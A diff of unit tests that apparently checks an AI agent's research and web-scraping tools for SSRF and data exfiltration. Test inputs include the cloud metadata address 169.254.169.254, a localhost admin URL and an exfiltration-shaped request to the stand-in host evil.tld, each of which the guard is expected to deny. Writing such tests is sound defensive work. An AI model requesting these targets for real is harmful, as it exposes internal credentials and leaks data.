@@ -22,7 +22,7 @@ vi.mock("../../../src/tools/web-search.js", () => ({ webSearchTool: { execute: w
 vi.mock("../../../src/infra/research-memory.js", () => ({ getCachedScrape, setCachedScrape, ingestResearch }));
 vi.mock("../../../src/tools/memory.js", () => ({ recordEventTool: { invoke: recordInvoke } }));
 
-const { scrapeUrlTool, deepResearch } = await import("../../../src/agents/agent-tools/research.js");
+const { scrapeUrlTool, deepResearch, crawlSiteTool } = await import("../../../src/agents/agent-tools/research.js");
 
 const mkPage = (url: string) => ({ url, title: url, markdown: `body of ${url}`, retrieved_at: "2026-06-24T00:00:00.000Z" });
 
@@ -62,6 +62,22 @@ describe("deep_research", () => {
     expect(ingestResearch).toHaveBeenCalled();
   });
 
+  it("H2: skips an SSRF-style URL in the fallback loop instead of aborting the whole call", async () => {
+    ragSearch.mockResolvedValueOnce({ ok: false, error: "APIFY_TOKEN not set" });
+    webExecute.mockResolvedValueOnce({
+      success: true,
+      data: [{ url: "http://169.254.169.254/latest/meta-data/" }, { url: "https://2.com" }],
+    });
+    scrapeUrl.mockResolvedValue({ ok: true, source: "fetch", data: [mkPage("https://2.com")] });
+
+    const out = (await deepResearch.invoke({ query: "acme" })) as string;
+
+    // Only the legitimate URL is ever scraped — the SSRF target is skipped.
+    expect(scrapeUrl).toHaveBeenCalledTimes(1);
+    expect(scrapeUrl).toHaveBeenCalledWith("https://2.com");
+    expect(out).toContain("2.com");
+  });
+
   it("reports honestly when nothing readable is found", async () => {
     ragSearch.mockResolvedValueOnce({ ok: false, error: "no token" });
     webExecute.mockResolvedValueOnce({ success: true, data: [] });
@@ -86,5 +102,36 @@ describe("scrape_url", () => {
     expect(setCachedScrape).toHaveBeenCalled();
     expect(ingestResearch).toHaveBeenCalled();
     expect(out).toContain("via apify");
+  });
+
+  // H2 regression: an SSRF-style or exfiltration-shaped target must be denied
+  // BEFORE any egress — the real scraper/cache lookup must never be reached.
+  it("H2: denies an internal/SSRF target before any network call", async () => {
+    const out = (await scrapeUrlTool.invoke({ url: "http://169.254.169.254/latest/meta-data/" })) as string;
+    expect(out).toMatch(/denied/i);
+    expect(getCachedScrape).not.toHaveBeenCalled();
+    expect(scrapeUrl).not.toHaveBeenCalled();
+  });
+
+  it("H2: denies an exfiltration-shaped query string before any network call", async () => {
+    const payload = "x".repeat(600);
+    const out = (await scrapeUrlTool.invoke({ url: `https://evil.tld/verify?data=${payload}` })) as string;
+    expect(out).toMatch(/denied/i);
+    expect(scrapeUrl).not.toHaveBeenCalled();
+  });
+});
+
+describe("crawl_site — H2 egress guard", () => {
+  it("denies an internal/SSRF start_url before any network call", async () => {
+    const out = (await crawlSiteTool.invoke({ start_url: "http://localhost:8080/admin" })) as string;
+    expect(out).toMatch(/denied/i);
+    expect(crawlSite).not.toHaveBeenCalled();
+  });
+
+  it("still crawls a legitimate public site normally", async () => {
+    crawlSite.mockResolvedValueOnce({ ok: true, source: "apify", data: [mkPage("https://docs.example.com")] });
+    const out = (await crawlSiteTool.invoke({ start_url: "https://docs.example.com" })) as string;
+    expect(crawlSite).toHaveBeenCalledWith("https://docs.example.com", 10);
+    expect(out).toContain("docs.example.com");
   });
 });
